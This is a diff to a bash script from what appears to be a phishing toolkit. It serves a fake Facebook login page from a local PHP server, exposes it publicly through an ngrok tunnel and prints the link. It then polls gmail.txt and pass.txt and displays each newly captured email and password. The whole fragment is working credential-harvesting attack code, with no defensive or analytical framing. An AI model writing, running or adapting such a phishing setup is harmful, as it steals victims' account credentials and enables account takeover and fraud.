@@ -86,21 +86,16 @@ check_ngrok
 start_server() {
 echo -e 'Starting server....'
 cd $HOME
-./ngrok http 3333 > /dev/null 2>&1 &
-sleep 5
-echo -e '\nNgrok started'
-cd $apache_dir
-php -S 127.0.0.1:3333 >/dev/null 2>&1 &
+php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 sleep 5
 echo -e '\nPhp started'
-cd $HOME
-apachectl >/dev/null 2>&1
-echo -e '\nApache2 started'
+cd $apache_dir
+./ngrok http 3333 >/dev/null 2>&1 &
+sleep 5
+echo -e '\nNgrok started'
 cd $HOME/GungaJarvis/utils/phishing/websites/facebook
 before_gmail=$(wc -l < gmail.txt)
 before_pass=$(wc -l < pass.txt)
-mv $HOME/GungaJarvis/utils/phishing/websites/facebook/* $apache_dir/
-mv $apache_dir/facebook.sh $HOME/GungaJarvis/utils/phishing/websites/facebook/
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "http://[0-9a-z]*\.ngrok.io")
 echo -e '\n\n'
 echo 'Ngrok link: ' $link
@@ -110,7 +105,7 @@ echo -e '\n\n'
 start_server
 
 transfer_items() {
-cd $apache_dir
+cd $HOME/GungaJarvis/utils/phishing/websites/facebook
 while true
 do
 after_gmail=$(wc -l < gmail.txt)
@@ -118,9 +113,6 @@ after_pass=$(wc -l < pass.txt)
 if [[ $after_gmail -gt $before_gmail && $after_pass -gt $before_pass ]]; then
 echo ''
 echo -e 'Credentials found....'
-mv $apache_dir/* $HOME/GungaJarvis/utils/phishing/websites/facebook
-cd $HOME/GungaJarvis/utils/phishing/websites/facebook
-mv manual $apache_dir
 cd $HOME/GungaJarvis/utils/phishing/websites/facebook
 echo -e '\n\n'
 echo 'Gmail: ' $(cat gmail.txt | tail -1)
